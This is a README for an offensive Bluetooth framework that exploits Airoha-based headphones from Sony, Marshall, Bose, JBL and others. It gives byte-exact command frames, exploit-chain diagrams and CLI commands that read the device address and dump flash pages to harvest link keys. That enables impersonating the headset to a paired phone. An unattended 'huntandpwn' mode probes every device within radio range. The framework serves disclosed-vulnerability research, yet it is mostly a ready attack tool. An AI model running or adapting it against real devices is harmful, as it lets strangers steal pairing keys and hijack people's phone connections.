<div align="center">

# R A C E

### Bluetooth Headphone Jacking Framework

<img width="377" height="299" alt="RACE framework" src="https://github.com/user-attachments/assets/7ffe41a7-0786-442c-9fda-7dfe75970006" />

[![Protocol](https://img.shields.io/badge/protocol-RACE_over_BLE-6f42c1?style=for-the-badge)](#03--protocol-internals)
[![CVEs](https://img.shields.io/badge/CVEs-3_critical-b31b1b?style=for-the-badge)](#01--vulnerability-surface)
[![Python](https://img.shields.io/badge/python-3.10-3776ab?style=for-the-badge&logo=python&logoColor=white)](#09--installation)
[![Platform](https://img.shields.io/badge/platform-Linux-1f6feb?style=for-the-badge&logo=linux&logoColor=white)](#13--troubleshooting)
[![Transport](https://img.shields.io/badge/transport-bleak_asyncio-ff9e1b?style=for-the-badge)](#02--system-architecture)
[![License](https://img.shields.io/badge/license-MIT-2ea043?style=for-the-badge)](LICENSE)

<sub><b>Church of Malware × ek0ms savi0r</b> · Airoha RACE research · 703 LOC · GATT, no pairing, no bonding</sub>

</div>

---

> [!CAUTION]
> **Authorized testing only.** Every technique documented here is an *active* radio interaction: connecting to a peer is observable by the device and by anything monitoring the piconet. Use it on hardware you own or have written permission to assess. No warranty — see [LICENSE](LICENSE).

---

## 00 · Quick start

```bash
git clone https://github.com/zazieproductions/RACE.git && cd RACE
sudo apt install -y bluez libbluetooth-dev && pip3 install --user "bleak>=0.22" "click>=8.1" colorama

sudo python3 race.py scan --deep --timeout 15        # enumerate, then verify 0x1200 on name matches
sudo python3 race.py exploit <MAC> --action dump     # build info → BD_ADDR → flash window
```

<sub>**Index** — [Vulnerability surface](#01--vulnerability-surface) · [Architecture](#02--system-architecture) · [Protocol](#03--protocol-internals) · [Exploit chain](#04--exploit-chain) · [Transport lifecycle](#05--transport-lifecycle) · [Data path](#06--command-data-path) · [Discovery](#07--discovery--targeting) · [Flash map](#08--flash-window--key-material) · [CLI](#10--cli-reference) · [Status](#11--implementation-status)</sub>

---

## 01 · Vulnerability surface

The Airoha RACE service is exposed over GATT **before** authentication. There is no pairing step, no bonding requirement, and no application-layer challenge between connection establishment and the first command — the trust boundary is the radio link itself, not the protocol.

| CVE | Severity | CVSS | Class | Primitive |
|:----|:---------|:----:|:------|:----------|
| **CVE-2025-20700** | ![critical](https://img.shields.io/badge/CRITICAL-b31b1b?style=flat-square) | **9.6** | Auth bypass | Unauthenticated RACE protocol access over BLE |
| **CVE-2025-20701** | ![high](https://img.shields.io/badge/HIGH-d29922?style=flat-square) | **8.8** | Memory corruption | Arbitrary flash read/write (`0x0403` / `0x0404`) |
| **CVE-2025-20702** | ![critical](https://img.shields.io/badge/CRITICAL-b31b1b?style=flat-square) | **9.1** | Credential exposure | Link key extraction → device impersonation |

**Attack prerequisites, in order of cost:**

| Requirement | Detail | Cost |
|:------------|:-------|:-----|
| Radio proximity | BLE advertising range (~10–30 m, class 2) | ![low](https://img.shields.io/badge/-trivial-2ea043?style=flat-square) |
| Adapter | Any HCI controller with BLE central role; BlueZ ≥ 5.55 recommended | ![low](https://img.shields.io/badge/-trivial-2ea043?style=flat-square) |
| Pairing / key | **None.** `0x1200` is reachable pre-authentication | ![low](https://img.shields.io/badge/-none-2ea043?style=flat-square) |
| Timing | Discoverable/connectable advertising window; some models stop advertising when connected to a phone | ![mid](https://img.shields.io/badge/-situational-d29922?style=flat-square) |

### Supported hardware

| Vendor | Models |
|:-------|:-------|
| **Sony** | WH-1000XM4, WH-1000XM5, WH-1000XM6, WF-1000XM3, WF-1000XM4, WF-1000XM5, WH-CH520, WH-CH720N, WH-XB910N, LinkBuds S, ULT Wear, WI-C100 |
| **Marshall** | ACTON III, MAJOR V, MINOR IV, MOTIF II, STANMORE III, WOBURN III |
| **Bose** | QuietComfort Earbuds III |
| **JBL** | Endurance Race 2, Live Buds 3 |
| **Jabra** | Elite 8 Active |
| **Beyerdynamic** | Amiron 300 |
| **Other** | EarisMax Bluetooth Auracast, JLab Epic Air Sport ANC |

Discovery does **not** use this list as ground truth — it is a substring heuristic over the advertised name (see [§07](#07--discovery--targeting)). Full compatibility matrix: [Insinuator.net disclosure](https://insinuator.net/2025/12/bluetooth-headphone-jacking-full-disclosure-of-airoha-race-vulnerabilities/).

---

## 02 · System architecture

Five layers, one direction of dependency: presentation never touches the radio, modules never own a socket, and the protocol layer is the only place bytes are encoded.

```mermaid
flowchart TB
    subgraph CLI["① PRESENTATION — race.py · click"]
        C_SCAN["scan<br/>--deep --timeout"]:::cmd
        C_HUNT["hunt"]:::cmd
        C_EXP["exploit TARGET<br/>--action"]:::cmd
        C_INFO["info TARGET"]:::cmd
        C_HP["huntandpwn"]:::cmd
    end

    subgraph MOD["② ORCHESTRATION — modules/"]
        M_DISC["discovery.py<br/>scan_for_targets()<br/>aggressive_scan()"]:::recon
        M_FP["fingerprint.py<br/>fingerprint()"]:::recon
        M_EXP["exploit.py<br/>auto_exploit()"]:::attack
        M_AH["auto_hunter.py<br/>hunt_and_pwn()"]:::attack
    end

    subgraph TR["③ TRANSPORT — transports/ble.py"]
        T_BLE["BLETransport<br/>async context manager<br/>asyncio.Queue response drain"]:::transport
    end

    subgraph PR["④ PROTOCOL — utils/packet.py · utils/config.py"]
        P_BUILD["build_race_packet()"]:::proto
        P_PARSE["parse_race_response()"]:::proto
        P_CFG["RACEConfig (frozen)<br/>UUIDs · heads · timeouts"]:::proto
    end

    subgraph LINK["⑤ LINK — BlueZ / bleak"]
        L_GATT["BLE GATT · ATT MTU"]:::link
        L_DEV["Airoha SoC<br/>service 0x1200"]:::device
    end

    C_SCAN --> M_DISC
    C_HUNT --> M_DISC
    C_HP --> M_AH
    C_EXP --> M_EXP
    C_INFO --> M_FP
    M_AH --> M_DISC
    M_AH --> M_EXP
    M_DISC --> T_BLE
    M_FP --> T_BLE
    M_EXP --> T_BLE
    T_BLE --> P_BUILD
    T_BLE --> P_PARSE
    P_CFG -.->|"single source of constants"| T_BLE
    P_BUILD --> L_GATT
    L_GATT <--> L_DEV
    L_GATT -->|"notify · 0x1202"| T_BLE

    classDef cmd fill:#1c2333,stroke:#6f42c1,color:#e9e3ff,stroke-width:1.5px
    classDef recon fill:#2a1f10,stroke:#f4a261,color:#ffe8cc,stroke-width:1.5px
    classDef attack fill:#2b0f14,stroke:#e63946,color:#ffd7dc,stroke-width:1.5px
    classDef transport fill:#0f2430,stroke:#48cae4,color:#d6f4ff,stroke-width:1.5px
    classDef proto fill:#1d1430,stroke:#9d4edd,color:#ecd9ff,stroke-width:1.5px
    classDef link fill:#14181f,stroke:#7d8590,color:#e6edf3,stroke-width:1.5px
    classDef device fill:#0f241c,stroke:#43aa8b,color:#d8f3e8,stroke-width:2px
    classDef capture fill:#1a1a1f,stroke:#6e7681,color:#c9d1d9,stroke-width:1.5px,stroke-dasharray:4 2
```

**Colour legend** — held constant across every diagram in this document:

| Violet | Amber | Red | Cyan | Magenta | Grey | Green |
|:------:|:-----:|:---:|:----:|:-------:|:----:|:-----:|
| presentation | recon | offensive | transport | protocol | radio / link | target / success |

### Component contract

| File | LOC | Responsibility | Public surface |
|:-----|----:|:---------------|:---------------|
| `race.py` | 166 | Argument parsing, logging, banner. **No research logic.** | `scan`, `hunt`, `exploit`, `info`, `huntandpwn` |
| `utils/config.py` | 53 | Frozen dataclass of protocol constants + timeouts; struct format strings | `RACEConfig`, `frame_header()`, `cmd()` |
| `utils/packet.py` | 109 | Frame encode/decode, opcode table, typed error hierarchy with codes | `build_race_packet()`, `parse_race_response()`, `RacePacket`, `RACEError` |
| `transports/ble.py` | 133 | Client lifecycle, service/characteristic resolution, notify drain, request/response correlation | `BLETransport`, `BLETransportError` |
| `modules/discovery.py` | 100 | Passive name heuristics + active service probing | `scan_for_targets()`, `aggressive_scan()` |
| `modules/fingerprint.py` | 24 | Single-shot build-info read | `fingerprint()` |
| `modules/exploit.py` | 88 | Fingerprint → BD_ADDR → flash window → key candidates | `auto_exploit()`, `struct_pack_flash()` |
| `modules/auto_hunter.py` | 30 | Chains discovery into exploitation | `hunt_and_pwn()` |
| `test_scan.py` | — | Standalone 5-second `BleakScanner` smoke test, no framework imports | — |

**Design invariants worth knowing before you patch:**

1. **One source of truth for constants.** No module hardcodes a UUID or opcode; everything resolves through `RACEConfig`.
2. **The transport owns its lifecycle.** `BLETransport` is an async context manager — `__aexit__`/`finally` tears down the client even on exception or timeout, so a failed command cannot leak a link.
3. **Parsing is strict and typed.** Every malformed field raises `RACEProtocolError` with a machine-readable `code`; the transport re-wraps it as `BLETransportError(code="BAD_RESPONSE")` so callers can distinguish *radio* failure from *protocol* failure.
4. **Modules return dicts, never raise.** `{"status": "success", ...}` or `{"status": "error", "message": ...}` — the CLI decides how to print. That keeps `race.py` presentation-only.

---

## 03 · Protocol internals

RACE frames are a fixed 6-byte header plus a variable payload. All multi-byte fields are **little-endian**.

```
        ┌────────┬────────┬────────────────┬───────────────┬──────────────────────┐
  byte  │   0    │   1    │     2 – 3      │     4 – 5     │      6 … 5 + N       │
        ├────────┼────────┼────────────────┼───────────────┼──────────────────────┤
  field │  Head  │  Type  │ Length (u16le) │  CMD (u16le)  │       Payload        │
  size  │  1 B   │  1 B   │      2 B       │      2 B      │         N B          │
  value │  0x05  │  0x00  │     2 + N      │    opcode     │    command data      │
        │  0x15  │  0x01  │                │               │                      │
        └────────┴────────┴────────────────┴───────────────┴──────────────────────┘
                 request         ↑                                        ↑
                 response     includes CMD                     N = Length − 2
```

| Field | Width | Encoding | Accepted values | Enforced by |
|:------|:------|:---------|:----------------|:------------|
| `Head` | 1 B | `u8` | `0x05` standard · `0x15` FOTA | `parse_race_response` → `BAD_HEAD` |
| `Type` | 1 B | `u8` | `0x00` request · `0x01` response | `parse_race_response` → `BAD_TYPE` |
| `Length` | 2 B | `u16le` | `len(CMD) + len(Payload)` = `2 + N` | `BAD_LENGTH` if `< 2` or payload overruns |
| `CMD` | 2 B | `u16le` | see opcode table | caller |
| `Payload` | N B | opaque | command-specific | `BAD_LENGTH` on short read |

> [!NOTE]
> The length field counts the **CMD bytes inside it**. A build-version request with an empty payload therefore carries `02 00`, not `00 00` — the single most common off-by-two when writing a new client.

### Opcode map

| Command | Opcode | Request payload | Reply consumed as | Status |
|:--------|:-------|:----------------|:------------------|:-------|
| Get Build Version | `0x1E08` | *empty* | UTF-8 string, `NUL`-stripped | ![done](https://img.shields.io/badge/implemented-2ea043?style=flat-square) |
| Get BD_ADDR | `0x0C05` | *empty* | `payload[0:6]` as `AA:BB:CC:DD:EE:FF` | ![done](https://img.shields.io/badge/implemented-2ea043?style=flat-square) |
| Read Flash | `0x0403` | `[0x00][count:u16le][offset:u32le]` | raw page bytes | ![done](https://img.shields.io/badge/implemented-2ea043?style=flat-square) |
| Write Flash | `0x0404` | mirror of read + data | status word | ![partial](https://img.shields.io/badge/constant_only-d29922?style=flat-square) |
| Read RAM | `0x1680` | address descriptor | memory bytes | ![partial](https://img.shields.io/badge/constant_only-d29922?style=flat-square) |
| Write RAM | `0x1681` | address + data | status word | ![partial](https://img.shields.io/badge/constant_only-d29922?style=flat-square) |
| FOTA start | `0x1E0F` | firmware stream, head `0x15` | status word | ![partial](https://img.shields.io/badge/head_0x15_only-d29922?style=flat-square) |

### Frame cookbook

Byte-exact requests as emitted by `build_race_packet()` — verified against the encoder:

| Operation | Length | Wire bytes |
|:----------|-------:|:-----------|
| Build version | 6 | `05 00 02 00 08 1E` |
| Bluetooth address | 6 | `05 00 02 00 05 0C` |
| Flash page @ `0x1A000` | 13 | `05 00 09 00 03 04 00 01 00 00 A0 01 00` |
| Flash page @ `0x1B000` | 13 | `05 00 09 00 03 04 00 01 00 00 B0 01 00` |
| RAM read | 6 | `05 00 02 00 80 16` |

Read-back conventions: build info is decode-as-UTF-8 with `NUL` stripped; BD_ADDR is the **first 6 payload bytes** rendered as `AA:BB:CC:DD:EE:FF`.

---

## 04 · Exploit chain

The full `--action full` path, with the actual frames on the wire:

```mermaid
sequenceDiagram
    autonumber
    participant U as Operator
    participant X as auto_exploit()
    participant T as BLETransport
    participant B as BlueZ / bleak
    participant H as Airoha headset

    U->>X: exploit A0:12:34:56:78:90 --action full
    X->>T: async with BLETransport(target)
    T->>B: BleakClient.connect(timeout=10 s)
    B->>H: LE Create Connection
    H-->>B: ATT carrier up
    T->>H: discover services
    H-->>T: 0x1200 RACE · 0x1201 TX · 0x1202 RX
    T->>H: start_notify(0x1202)
    Note over T,H: no pairing, no bonding, no challenge
    X->>T: send_command(0x1E08)
    T->>H: 05 00 02 00 08 1E
    H-->>T: 05 01 .. 1E 08 + ASCII build
    T-->>X: payload → SoC / SDK / build stamp
    X->>T: send_command(0x0C05)
    T->>H: 05 00 02 00 05 0C
    H-->>T: payload[0:6] → BD_ADDR
    X->>T: send_command(0x0403, 00 01 00 00 A0 01 00)
    T->>H: 05 00 09 00 03 04 00 01 00 00 A0 01 00
    H-->>T: 1 page at 0x1A000 (size firmware-defined)
    Note over X: 16-byte stride scan over first 240 B,<br/>flag blocks whose first 8 B are non-zero
    X-->>U: status=success · build · bd_addr
```

### What each stage actually buys you

| Stage | Primitive | Opcode | Output | Why it matters |
|:------|:----------|:-------|:-------|:---------------|
| **Recon** | Unauthenticated GATT connect | — | Service map | Proves the device ships RACE enabled; rejects non-Airoha peers in one round trip |
| **Fingerprint** | Build version read | `0x1E08` | SoC, SDK, timestamp | Selects the correct flash layout and offsets for the next stage |
| **Identity** | BD_ADDR read | `0x0C05` | Classic address | Classic BT address differs from the BLE address; required for impersonation |
| **Extraction** | Flash page read | `0x0403` | Page-sized reads | Link keys live in plaintext in the `0x1A000`–`0x1D000` window |
| **Reuse** | Link-key replay | — | Cloned identity | A recovered key lets a second controller present as the headset to the paired phone |
| **Pivot** | HFP over Classic | — | Calls, contacts, messages | Downstream of impersonation; not implemented in this framework |

> [!WARNING]
> Stage 5 is where this stops being read-only. Writing flash (`0x0404`) against a live device can brick it — there is no recovery path in this repository. Treat the write primitive as research-only until you have a dump and an off-device backup.

---

## 05 · Transport lifecycle

`BLETransport` is a five-state object with deterministic teardown. Nothing is left connected, ever — including when a command times out mid-flight.

```mermaid
stateDiagram-v2
    [*] --> Idle
    Idle --> Connecting: connect()
    Connecting --> Resolving: ATT carrier up
    Connecting --> Closed: timeout 10 s
    Resolving --> Armed: 0x1200 + 0x1201 resolved
    Resolving --> Closed: SERVICE_NOT_FOUND / TX_NOT_FOUND
    Armed --> Armed: send_command() → parse → payload
    Armed --> Closed: __aexit__ / disconnect()
    Closed --> [*]
```

| Transition | Guard | Failure code |
|:-----------|:------|:-------------|
| `Idle → Connecting` | not already connected | — |
| `Connecting → Resolving` | `client.is_connected` | `NO_RESPONSE` if link drops |
| `Resolving → Armed` | service `0x1200` + characteristic `0x1201` present | `SERVICE_NOT_FOUND`, `TX_NOT_FOUND` |
| `Armed → Armed` | frame written with response, reply queued within read timeout | `NO_RESPONSE`, `BAD_RESPONSE` |
| `* → Closed` | context-manager exit, exception, or explicit call | — |

### Timeout budget

| Parameter | Default | Scope | Override |
|:----------|--------:|:------|:---------|
| `connect_timeout_s` | `10.0` | ATT connection establishment | `RACEConfig` field |
| `read_timeout_s` | `5.0` | Waiting for a queued notification | `RACEConfig` field |
| `scan_timeout_s` | `10.0` | Passive discovery window | `--timeout` on `scan`/`hunt` |
| deep-probe connect | `5` s | per candidate in `scan --deep` | hard-coded in `discovery.py` |
| hunt-probe connect | `3` s | per peer in `aggressive_scan` | hard-coded in `discovery.py` |

### Error taxonomy

Every failure carries a stable `code` so callers can branch without string matching:

| Code | Raised at | Meaning | Blast radius |
|:-----|:----------|:--------|:-------------|
| `TOO_SHORT` | parser | Fewer than 6 bytes, or header truncated | ![low](https://img.shields.io/badge/-response_dropped-f4a261?style=flat-square) |
| `BAD_HEAD` | parser | Head not `0x05`/`0x15` — not a RACE frame | ![low](https://img.shields.io/badge/-response_dropped-f4a261?style=flat-square) |
| `BAD_TYPE` | parser | Type outside `0x00`/`0x01` | ![low](https://img.shields.io/badge/-response_dropped-f4a261?style=flat-square) |
| `BAD_LENGTH` | parser | Length `< 2` or payload overruns the frame | ![low](https://img.shields.io/badge/-response_dropped-f4a261?style=flat-square) |
| `SERVICE_NOT_FOUND` | transport | Peer connected but exposes no `0x1200` | ![mid](https://img.shields.io/badge/-target_skipped-d29922?style=flat-square) |
| `TX_NOT_FOUND` | transport | Service present, write characteristic missing | ![mid](https://img.shields.io/badge/-target_skipped-d29922?style=flat-square) |
| `NO_RESPONSE` | transport | Nothing queued within `read_timeout_s` | ![mid](https://img.shields.io/badge/-retry_delay-d29922?style=flat-square) |
| `BAD_RESPONSE` | transport | Reply queued but unparseable | ![mid](https://img.shields.io/badge/-command_aborted-d29922?style=flat-square) |
| `CLOSED` | transport | Reuse of a torn-down transport | ![high](https://img.shields.io/badge/-caller_bug-e63946?style=flat-square) |

Hierarchy: `RACEError` → `RACEProtocolError` → `BLETransportError`, so a bare `except RACEProtocolError` catches every malformed-bytes path while leaving radio errors distinguishable. A parallel `RACETransportError` is defined in `utils/packet.py` for call sites that want a transport-typed exception without importing the BLE layer.

---

## 06 · Command data path

One `send_command()` call, end to end — encode, write, notify, drain, validate:

```mermaid
flowchart LR
    A["cmd: int<br/>payload: bytes"]:::proto --> B["build_race_packet()<br/>head 0x05 · type 0x00<br/>length = 2 + N"]:::proto
    B --> C["write_gatt_char(TX 0x1201,<br/>response=True)"]:::transport
    B -.->|capture TX| B2["capture TX<br/>pcap / btsnoop"]:::capture
    C --> D["Airoha SoC"]:::device
    D --> E["notification on RX 0x1202"]:::link
    E --> F["asyncio.Queue<br/>response drain"]:::transport
    F -.->|capture RX, pre-parse| F2["capture RX<br/>raw or malformed"]:::capture
    F --> G["parse_race_response()<br/>head · type · length · cmd"]:::proto
    G --> H{"fields valid?"}:::proto
    H -->|"yes"| I["RacePacket.payload"]:::ok
    H -->|"no"| J["BLETransportError<br/>code = BAD_RESPONSE"]:::err
    I --> K["auto_exploit()<br/>status = success"]:::ok
    J --> K

    classDef proto fill:#1d1430,stroke:#9d4edd,color:#ecd9ff,stroke-width:1.5px
    classDef transport fill:#0f2430,stroke:#48cae4,color:#d6f4ff,stroke-width:1.5px
    classDef link fill:#14181f,stroke:#7d8590,color:#e6edf3,stroke-width:1.5px
    classDef device fill:#0f241c,stroke:#43aa8b,color:#d8f3e8,stroke-width:2px
    classDef capture fill:#1a1a1f,stroke:#6e7681,color:#c9d1d9,stroke-width:1.5px,stroke-dasharray:4 2
    classDef ok fill:#0f241c,stroke:#2ea043,color:#d8f3e8,stroke-width:1.5px
    classDef err fill:#2b0f14,stroke:#e63946,color:#ffd7dc,stroke-width:1.5px
```

Two properties shape how you drive it:

- **Request/response pairing is sequential by construction.** `send_command` writes, then `await`s one item from the queue under `read_timeout_s`. There is no per-opcode correlation, so callers must keep commands serial per transport — fire two concurrently and both will consume from the same queue.
- **Payload, not frame.** Callers never see head, type, or length bytes — the parser strips them and hands back `payload` only. That is why `auto_exploit` can slice `raw[:6]` for the BD_ADDR without arithmetic.

### Wire capture — replay the session in Wireshark

Every frame the transport writes, and every frame it hands to `parse_race_response()`, can be mirrored into a capture file. One flag turns it on for any GATT session; the env var does it without editing the command line:

```bash
# group option — place it before the subcommand
sudo python3 race.py --capture /tmp/session.pcap exploit A0:12:34:56:78:90 --action dump

# or set it once for every invocation, including unattended runs
RACE_CAPTURE=/tmp/session.btsnoop sudo -E python3 race.py huntandpwn --timeout 30
```

| Path / flag | Container | Open with |
|:------------|:----------|:----------|
| `.pcap`, `.cap`, anything else | libpcap, `LINKTYPE_BLUETOOTH_HCI_H4_WITH_PHDR` (201) | Wireshark, `tshark`, `tcpdump -r` |
| `.btsnoop`, `.snoop` | btsnoop v1, datalink 1002 (H4 UART) | Wireshark, `btmon -r` |

`--capture-format {pcap,btsnoop}` (or `RACE_CAPTURE_FORMAT`) overrides the extension. Each RACE frame is wrapped in a synthetic **HCI ACL → L2CAP (CID `0x0004`) → ATT PDU** chain — requests as ATT Write Commands on handle `0x0023`, responses as ATT Handle Value Notifications on `0x0026` — with the RACE bytes untouched as the attribute value. Direction rides in the pcap pseudo-header and the btsnoop flags, so both readers label host → device and device → host correctly.

```bash
# just the RACE frames, as hex + opcode, no GUI
tshark -r /tmp/session.pcap -Y btatt -T fields -e btatt.opcode -e btatt.value

# text replay through BlueZ instead of Wireshark
btmon -r /tmp/session.btsnoop
```

Records are flushed per frame, so a killed or crashed session still leaves a loadable file. A capture that cannot be opened or written (bad path, full disk) logs a warning and never interrupts the radio session. Only sessions that speak the protocol produce frames — `scan` and `hunt` stop at discovery and never reach the parser.

---

## 07 · Discovery & targeting

Two complementary strategies, one passive and one loud:

| Mode | Implementation | Radio cost | Returns |
|:-----|:---------------|:-----------|:--------|
| **Passive enumerate** | `BleakScanner.discover(return_adv=True)` | Receive-only, invisible | Every advertiser + RSSI + name |
| **Deep probe** | Filter by name heuristic, then connect one-by-one | Connect per candidate | Adds `race_service`, `race_tx` booleans |
| **Aggressive hunt** | Connect to **every** peer, read service table | Connect per advertiser, 3 s cap | Confirmed `0x1200` holders only |

### Name heuristic

```python
VULNERABLE_MODELS = [
    "WH-1000XM", "WF-1000XM", "WH-CH", "LinkBuds", "ULT Wear",
    "Marshall", "JBL", "Bose", "Jabra", "Beyerdynamic",
]
```

Substring match against the advertised local name. It is a **pre-filter, not proof** — a renamed Sony headset drops out of `scan --deep`, while any device that puts "Bose" in its name gets probed. `aggressive_scan` deliberately ignores the list and verifies the service UUID instead; use it when the heuristic is suspect.

```mermaid
flowchart TD
    S["huntandpwn --timeout 20"]:::cmd --> A["aggressive_scan(config, 20)"]:::recon
    A --> B{"0x1200 discovered<br/>on any peer?"}:::recon
    B -->|"no"| Z["no targets — exit"]:::err
    B -->|"yes"| C["for each candidate<br/>auto_exploit(addr, 'dump')"]:::attack
    C --> D{"fingerprint ok?"}:::attack
    D -->|"no"| E["record message<br/>continue"]:::err
    D -->|"yes"| F["walk 0x1A000 → 0x1D000<br/>one page read per offset"]:::attack
    F --> G["16 B stride over page body<br/>flag non-zero 8 B prefixes"]:::attack
    G --> H["[+] candidate key material"]:::ok

    classDef cmd fill:#1c2333,stroke:#6f42c1,color:#e9e3ff,stroke-width:1.5px
    classDef recon fill:#2a1f10,stroke:#f4a261,color:#ffe8cc,stroke-width:1.5px
    classDef attack fill:#2b0f14,stroke:#e63946,color:#ffd7dc,stroke-width:1.5px
    classDef ok fill:#0f241c,stroke:#2ea043,color:#d8f3e8,stroke-width:1.5px
    classDef err fill:#1a1a1f,stroke:#6e7681,color:#c9d1d9,stroke-width:1.5px
```

---

## 08 · Flash window & key material

`struct_pack_flash(offset)` emits `[0x00][count:u16le=1][offset:u32le]` — seven payload bytes, thirteen on the wire. Four offsets are attempted, and the loop stops at the first reply that parses:

| Page | Offset | Request | Read strategy | Expected content |
|:-----|:-------|:--------|:--------------|:-----------------|
| P0 | `0x1A000` | `count=1` | first successful read confirms the primitive; loop exits here | primary extraction window in public research |
| P1 | `0x1B000` | `count=1` | same descriptor, incremented offset | settings + key material on some SDKs |
| P2 | `0x1C000` | `count=1` | — | calibration blobs |
| P3 | `0x1D000` | `count=1` | — | calibration blobs |

Page size is **firmware-defined**, not fixed by the protocol: `count` selects pages, not bytes, and the caller receives whatever the device returns for that region. The exploit only requires a reply longer than 10 bytes to start scanning, so it makes no assumption about a 4 KiB geometry.

Key harvesting is heuristic, and intentionally conservative:

1. Take the transport payload (frame head, type, length and CMD are already stripped by `parse_race_response`).
2. Skip 6 further bytes (`raw[6:]`), then stride 16 bytes across that slice while the index stays below `min(len(data) - 16, 256)`.
3. Flag any stride whose first 8 bytes are all non-zero — a cheap entropy proxy, not a validated key.

> [!TIP]
> A flagged block is a **candidate**, not a link key. Confirm by length (16 B for BLE LTK) and by replaying the value in a paired-phone simulation before drawing conclusions. False positives are common in pages holding calibration data.

---

## 09 · Installation

```bash
# 1 · clone
git clone https://github.com/zazieproductions/RACE.git
cd RACE

# 2 · system dependencies (BlueZ headers + HCI tooling)
sudo apt update
sudo apt install -y bluez libbluetooth-dev python3-pip

# 3 · python dependencies
pip3 install --user "bleak>=0.22" "click>=8.1" colorama

# 4 · verify the radio without the framework
sudo python3 test_scan.py

# 5 · entry point
chmod +x race.py
```

| Dependency | Role | Absent → |
|:-----------|:-----|:---------|
| `bleak` | Async BLE GATT client over BlueZ/D-Bus | no transport at all |
| `click` | Command group, options, `--action` choice validation | CLI won't import |
| `colorama` | Banner + inline ANSI, cross-terminal | plain, uncoloured output |

Wire capture ([§06](#06--command-data-path)) needs no extra dependency — pcap and btsnoop are written with `struct` from the standard library, so there is no libpcap binding to install.

---

## 10 · CLI reference

| Command | Flags | Path taken | Default timeout |
|:--------|:------|:-----------|:----------------|
| `scan` | `--deep`, `--timeout` | `scan_for_targets()` | 10 s |
| `hunt` | `--timeout` | `aggressive_scan()` | 15 s |
| `exploit <target>` | `--action {fingerprint,dump,full}` | `auto_exploit()` | read 5 s |
| `info <target>` | — | `fingerprint()` | read 5 s |
| `huntandpwn` | `--timeout` | `hunt_and_pwn()` | 20 s |

Group-level flags (valid on every command, before the subcommand): `--capture PATH` / `RACE_CAPTURE`, `--capture-format {pcap,btsnoop}` / `RACE_CAPTURE_FORMAT`. See [§06](#06--command-data-path).

```bash
# passive enumerate, then verify services on name-matched peers
sudo python3 race.py scan --deep --timeout 15

# confirm 0x1200 across every advertiser (ignores the name heuristic)
sudo python3 race.py hunt --timeout 20

# single-target staging: build info only → no flash touched
sudo python3 race.py exploit A0:12:34:56:78:90 --action fingerprint

# add BD_ADDR + flash window
sudo python3 race.py exploit A0:12:34:56:78:90 --action dump

# full chain including impersonation stage
sudo python3 race.py exploit A0:12:34:56:78:90 --action full

# discovery → exploitation, unattended
sudo python3 race.py huntandpwn --timeout 30

# same run, with the wire traffic saved for triage
sudo python3 race.py --capture /tmp/session.pcap huntandpwn --timeout 30
```

`--action` and the subcommand set are validated by `click.Choice`, so a typo fails before any radio traffic is generated.

---

## 11 · Implementation status

Honest matrix — what exists, what is a constant, and what is not written yet:

| Capability | Component | State |
|:-----------|:----------|:------|
| BLE discovery + RSSI | `modules/discovery.py` | ![done](https://img.shields.io/badge/implemented-2ea043?style=flat-square) |
| Deep service verification | `modules/discovery.py` | ![done](https://img.shields.io/badge/implemented-2ea043?style=flat-square) |
| Build fingerprint (`0x1E08`) | `modules/fingerprint.py` | ![done](https://img.shields.io/badge/implemented-2ea043?style=flat-square) |
| BD_ADDR read (`0x0C05`) | `modules/exploit.py` | ![done](https://img.shields.io/badge/implemented-2ea043?style=flat-square) |
| Flash page read (`0x0403`) | `modules/exploit.py` | ![done](https://img.shields.io/badge/implemented-2ea043?style=flat-square) |
| Automated chain | `modules/auto_hunter.py` | ![done](https://img.shields.io/badge/implemented-2ea043?style=flat-square) |
| Flash write (`0x0404`) | `utils/packet.py` | ![part](https://img.shields.io/badge/opcode_only-d29922?style=flat-square) |
| RAM read/write (`0x1680`/`0x1681`) | `utils/packet.py` | ![part](https://img.shields.io/badge/opcode_only-d29922?style=flat-square) |
| FOTA path (head `0x15`) | `utils/config.py` | ![part](https://img.shields.io/badge/constants_only-d29922?style=flat-square) |
| Wire capture for Wireshark/btmon | `utils/capture.py` | ![done](https://img.shields.io/badge/implemented-2ea043?style=flat-square) |
| Classic RFCOMM transport | `transports/` | ![todo](https://img.shields.io/badge/planned-6e7681?style=flat-square) |
| Link-key validation + replay | `modules/exploit.py` | ![todo](https://img.shields.io/badge/stub-6e7681?style=flat-square) |
| HFP pivot (calls, contacts) | — | ![todo](https://img.shields.io/badge/out_of_scope-6e7681?style=flat-square) |

> [!IMPORTANT]
> Status above describes **code present in this tree**, verified by reading the call graph — not by a hardware test run. Two gaps are worth knowing before you trust an unattended chain:
>
> - **Response plumbing.** `BLETransport._notification_handler` queues the *coroutine* returned by `read_gatt_char()` instead of awaiting it, and ignores the `(sender, data)` arguments that bleak passes to the notify callback. On the current tree a reply therefore reaches `parse_race_response()` as a coroutine object and fails the `bytes` check with `BAD_RESPONSE`. Treat `send_command()` as needing a hardware pass until that is addressed.
> - **Deep-scan flag.** `scan --deep` is honoured inside `scan_for_targets()`, but `_build_config()` drops its `deep` argument; the flag never reaches `RACEConfig`. It works today only because the module takes it as a separate parameter.

---

## 12 · Repository layout

```
RACE/
├── race.py                  # click CLI — presentation only
├── test_scan.py             # 5 s BleakScanner smoke test, dependency-free
├── core/                    # reserved namespace (empty package)
│   └── __init__.py
├── modules/
│   ├── discovery.py         # name heuristic + service probing
│   ├── fingerprint.py       # 0x1E08 build read
│   ├── exploit.py           # fingerprint → BD_ADDR → flash window
│   └── auto_hunter.py       # discovery → exploitation chain
├── transports/
│   ├── __init__.py
│   └── ble.py               # GATT client, notify drain, request/response
└── utils/
    ├── capture.py           # pcap/btsnoop wire capture (Wireshark, btmon)
    ├── config.py            # RACEConfig: UUIDs, heads, timeouts
    └── packet.py            # frame encode/decode, opcodes, error codes
```

> [!NOTE]
> `transports/classic.py` and `core/session.py` do **not** exist in this tree; Classic/RFCOMM work is tracked in [§11](#11--implementation-status). The BLE path is the only one with a live transport.

---

## 13 · Troubleshooting

| Symptom | Likely cause | Fix |
|:--------|:-------------|:----|
| `SERVICE_NOT_FOUND` | Device is not Airoha, or RACE service is disabled in firmware | Confirm the peer with `hunt`; check the SoC against [§01](#01--vulnerability-surface) |
| `NO_RESPONSE` | RX notifications not armed, or the device only answers on a specific ATT MTU | Verify `0x1202` notify is enabled; re-issue the command once |
| `BAD_RESPONSE` | Wrong opcode for the firmware generation, or a reply that never reached the parser as bytes (see [§11](#11--implementation-status)) | Re-fingerprint with `--action fingerprint`; cross-check the SDK build string |
